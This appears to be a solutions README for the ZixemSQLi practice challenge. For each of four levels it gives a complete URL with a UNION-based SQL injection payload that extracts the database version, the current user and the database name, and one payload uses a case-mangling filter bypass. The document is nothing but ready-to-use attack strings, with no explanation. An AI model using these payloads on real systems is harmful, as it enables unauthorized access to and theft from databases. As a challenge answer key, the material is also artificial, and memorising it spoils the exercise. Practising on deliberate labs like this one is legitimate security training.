# ZixemSQLi Challange

[READ RULES](http://www.zixem.altervista.org/SQLi/index.php)

## LEVEL 1

```
http://www.zixem.altervista.org/SQLi/level1.php?id=1111%20union%20select%20concat_ws(0x3a,%20version(),%20user()),%2022,%203
```

## LEVEL 2

```
http://www.zixem.altervista.org/SQLi/level2.php?showprofile=-1' union select database(),version(),user(),4--+
```

## LEVEL 3

```
http://www.zixem.altervista.org/SQLi/level3.php?item=-4%27%20unionon%20SeLect%20database(),User(),version(),4--+
```

## LEVEL 4

```
http://www.zixem.altervista.org/SQLi/level4.php?ebookid=999%27%20union%20select%20version(),2,user(),4,5--+
```



